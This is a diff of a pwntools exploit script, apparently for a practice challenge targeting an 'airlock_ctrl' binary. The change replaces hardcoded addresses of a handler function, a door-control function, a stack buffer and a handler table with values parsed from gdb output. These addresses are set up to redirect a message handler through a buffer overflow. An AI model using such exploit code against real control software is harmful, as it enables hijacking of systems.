@@ -4,18 +4,36 @@
 # for easy access
 from pwn import *
 import math
+import re
 
 EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
 context.binary = EXE_PATH
 
-# HandleSetSuitOccupant
-ORIGINAL_FUNCTION_ADDRESS = 0x55555555671d
-# ControlDoor
-INJECT_FUNCTION_ADDRESS = 0x555555555333
-# message_serialization_buffer
-BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
-# message_handlers
-HANDLERS_ADDRESS = 0x55555555a7c0
+# # HandleSetSuitOccupant
+# ORIGINAL_FUNCTION_ADDRESS = 0x55555555671d
+# # ControlDoor
+# INJECT_FUNCTION_ADDRESS = 0x555555555333
+# # message_serialization_buffer
+# BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
+# # message_handlers
+# HANDLERS_ADDRESS = 0x55555555a7c0
+with open('./bin/mem_locations.txt', 'r') as fd:
+    lines = fd.read()
+base_re =  r" = .*?0x([0-9a-fA-F]+)"
+# $1 = {void (const void *, size_t, AirlockState *)} 0x55555555671d <HandleSetSuitOccupant>
+# $2 = {_Bool (uint32_t, uint32_t, _Bool)} 0x555555555333 <ControlDoor>
+# $3 = (void *) 0x7fffffffe8a8
+# $4 = (SDNHandler *) 0x55555555a7c0
+m = re.search(r"\$1" + base_re, lines)
+ORIGINAL_FUNCTION_ADDRESS = int(m.group(1), 16)
+m = re.search(r"\$2" + base_re, lines)
+INJECT_FUNCTION_ADDRESS = int(m.group(1), 16)
+m = re.search(r"\$3" + base_re, lines)
+BUFFER_STACK_ADDRESS = int(m.group(1), 16)
+m = re.search(r"\$4" + base_re, lines)
+HANDLERS_ADDRESS = int(m.group(1), 16)
+
+
 
 # This is the size initially allocated for rx_message_buffer before the bound is increased.
 BUFFER_SIZE = 256
